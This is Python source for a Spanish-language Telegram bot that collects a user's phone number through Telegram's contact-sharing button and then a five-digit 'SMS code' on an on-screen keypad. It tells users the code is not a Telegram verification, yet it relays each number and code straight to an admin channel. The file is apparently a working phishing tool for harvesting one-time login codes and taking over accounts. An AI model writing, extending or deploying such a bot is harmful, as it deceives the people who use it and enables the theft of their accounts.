import os
import logging
from datetime import datetime
from telegram import (
    Update, KeyboardButton, ReplyKeyboardMarkup,
    InlineKeyboardButton, InlineKeyboardMarkup
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_CHANNEL_ID = os.getenv("ADMIN_CHANNEL_ID", "").strip()  # p.ej. -1002756519910

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s: %(message)s")
log = logging.getLogger("verify-bot")

UD_PHONE = "phone"
UD_CODE  = "code"

def share_phone_kb():
    btn = KeyboardButton("📲 Compartir mi número (recomendado)", request_contact=True)
    return ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)

def build_keypad(code_str: str):
    rows = [
        [InlineKeyboardButton("1", callback_data="d:1"),
         InlineKeyboardButton("2", callback_data="d:2"),
         InlineKeyboardButton("3", callback_data="d:3")],
        [InlineKeyboardButton("4", callback_data="d:4"),
         InlineKeyboardButton("5", callback_data="d:5"),
         InlineKeyboardButton("6", callback_data="d:6")],
        [InlineKeyboardButton("7", callback_data="d:7"),
         InlineKeyboardButton("8", callback_data="d:8"),
         InlineKeyboardButton("9", callback_data="d:9")],
        [InlineKeyboardButton("← Borrar", callback_data="del"),
         InlineKeyboardButton("0", callback_data="d:0"),
         InlineKeyboardButton("✅ Confirmar", callback_data="ok")],
        [InlineKeyboardButton("❌ Cancelar", callback_data="cancel")]
    ]
    progreso = " ".join(list(code_str)) if code_str else "—"
    text = (
        "🔐 *Verificación por SMS (no es de Telegram)*\n"
        "Introduce el *código de 5 dígitos* que te enviamos *vía SMS* y luego toca *✅ Confirmar*.\n\n"
        f"Código: `{progreso}`"
    )
    return text, InlineKeyboardMarkup(rows)

# /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data[UD_CODE] = ""
    context.user_data.pop(UD_PHONE, None)
    await update.message.reply_text(
        "Hola 👋\n"
        "Para continuar, comparte tu número con el botón de abajo.\n\n"
        "🔎 *Importante:* esto **NO** es verificación de Telegram. "
        "Te enviaremos un código por *SMS*.",
        reply_markup=share_phone_kb(), parse_mode="Markdown"
    )

# CONTACTO NATIVO (lo importante)
async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.contact:
        return

    phone = msg.contact.phone_number
    user = update.effective_user

    # Guardar y limpiar buffer
    context.user_data[UD_PHONE] = phone
    context.user_data[UD_CODE]  = ""

    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    admin_text = (
        "📥 *Nuevo número recibido*\n"
        f"- Teléfono: `{phone}`\n"
        f"- Usuario: @{user.username or 'sin_username'} (id {user.id})\n"
        f"- Fecha/Hora: {stamp}"
    )

    # 1) Enviar al grupo INMEDIATO
    try:
        if ADMIN_CHANNEL_ID:
            await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")
            log.info("Número enviado al destino %s", ADMIN_CHANNEL_ID)
    except Exception as e:
        log.exception("Error enviando número al destino: %s", e)

    # 2) Confirmar al usuario y mostrar keypad
    await msg.reply_text(f"✅ Número recibido: {phone}\nAhora introduce el *código de 5 dígitos* (SMS).",
                         parse_mode="Markdown")
    text, kb = build_keypad("")
    await msg.reply_text(text, reply_markup=kb, parse_mode="Markdown")

# BOTONERA (código)
async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    code = context.user_data.get(UD_CODE, "")
    data = q.data or ""

    if data.startswith("d:") and len(code) < 5:
        code += data.split(":")[1]
    elif data == "del":
        code = code[:-1]
    elif data == "cancel":
        context.user_data[UD_CODE] = ""
        await q.edit_message_text("Operación cancelada. Usa /start para reintentarlo.")
        return
    elif data == "ok":
        phone = context.user_data.get(UD_PHONE, "desconocido")
        user  = update.effective_user
        stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        admin_text = (
            "🧩 *Código ingresado por el cliente*\n"
            f"- Teléfono: `{phone}`\n"
            f"- Código (SMS externo): `{code}`\n"
            f"- Usuario: @{user.username or 'sin_username'} (id {user.id})\n"
            f"- Fecha/Hora: {stamp}"
        )
        try:
            if ADMIN_CHANNEL_ID:
                await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")
                log.info("Código enviado al destino %s", ADMIN_CHANNEL_ID)
        except Exception as e:
            log.exception("Error enviando código al destino: %s", e)

        await q.edit_message_text("✅ ¡Gracias! Hemos recibido tu código. Te confirmaremos en breve.")
        context.user_data[UD_CODE] = ""
        return

    context.user_data[UD_CODE] = code
    text, kb = build_keypad(code)
    try:
        await q.edit_message_text(text, reply_markup=kb, parse_mode="Markdown")
    except Exception:
        await q.message.edit_reply_markup(reply_markup=kb)

# AYUDA: si el usuario manda otra cosa en PRIVADO, le explicamos qué hacer
async def private_fallback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat and update.effective_chat.type == "private":
        await update.message.reply_text(
            "⚠️ Eso no es tu número compartido con el botón nativo.\n\n"
            "Por favor toca **📲 Compartir mi número (recomendado)** para enviarlo automáticamente.",
            reply_markup=share_phone_kb()
        )

# Diagnóstico
async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"chat_id: {update.effective_chat.id}")

async def testsend_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await context.bot.send_message(ADMIN_CHANNEL_ID, "🟢 Test: el bot puede enviar aquí.")
        await update.message.reply_text("✅ Test enviado. Revisa el destino.")
    except Exception as e:
        await update.message.reply_text(f"❌ Falló el envío: {e}")
        log.exception("Testsend falló: %s", e)

async def on_startup(app):
    if ADMIN_CHANNEL_ID:
        try:
            await app.bot.send_message(ADMIN_CHANNEL_ID, "🟢 Bot online (inicio exitoso).")
        except Exception as e:
            log.exception("No pude enviar mensaje de arranque: %s", e)

def main():
    if not BOT_TOKEN:
        raise RuntimeError("Falta BOT_TOKEN")
    app = ApplicationBuilder().token(BOT_TOKEN).post_init(on_startup).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, on_contact))                # caso correcto
    app.add_handler(CallbackQueryHandler(keypad_cb))
    app.add_handler(CommandHandler("id", id_cmd))
    app.add_handler(CommandHandler("testsend", testsend_cmd))
    # Fallback solo en privado para guiar al usuario
    app.add_handler(MessageHandler(filters.ChatType.PRIVATE & ~filters.COMMAND & ~filters.CONTACT, private_fallback))

    app.run_polling()

if __name__ == "__main__":
    main()
